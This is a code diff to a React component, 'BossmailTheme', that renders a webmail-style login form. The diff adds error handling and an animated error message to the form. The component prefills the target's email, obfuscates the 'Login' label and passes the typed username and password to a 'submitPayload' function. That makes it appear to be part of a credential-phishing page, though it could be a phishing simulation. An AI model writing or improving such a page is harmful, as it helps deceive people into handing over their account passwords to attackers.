@@ -13,7 +13,7 @@ const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
   const [username, setUsername] = useState(prefilledEmail || '');
   const [password, setPassword] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { reportViolation, submitPayload } = useSecurity();
+  const { reportViolation, submitPayload, error, setError } = useSecurity();
 
   const handleSubmit = async () => {
     setIsSubmitting(true);
@@ -101,7 +101,10 @@ const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
                 type="text" 
                 placeholder="username" 
                 value={username}
-                onChange={(e) => setUsername(e.target.value)}
+                onChange={(e) => {
+                  setUsername(e.target.value);
+                  if (error) setError(null);
+                }}
                 className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
               />
             </div>
@@ -116,7 +119,10 @@ const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
                 type="password" 
                 placeholder="Password" 
                 value={password}
-                onChange={(e) => setPassword(e.target.value)}
+                onChange={(e) => {
+                  setPassword(e.target.value);
+                  if (error) setError(null);
+                }}
                 className="w-full pl-10 pr-4 py-2 border border-gray-300 text-[14px] focus:outline-none focus:border-[#1c74b4] transition-colors"
               />
             </div>
@@ -136,6 +142,16 @@ const BossmailTheme: React.FC<BossmailThemeProps> = ({ prefilledEmail }) => {
             >
               {isSubmitting ? '...' : <ObfuscatedText text="Login" />}
             </button>
+
+            {error && (
+              <motion.div 
+                initial={{ opacity: 0, y: -10 }}
+                animate={{ opacity: 1, y: 0 }}
+                className="text-[#ef8133] text-[12px] text-center font-medium bg-orange-50 py-2 rounded border border-orange-100"
+              >
+                {error}
+              </motion.div>
+            )}
 
             <div className="text-left">
               <a href="#" className="text-[#1c74b4] text-[13px] hover:underline">Forget the password?</a>
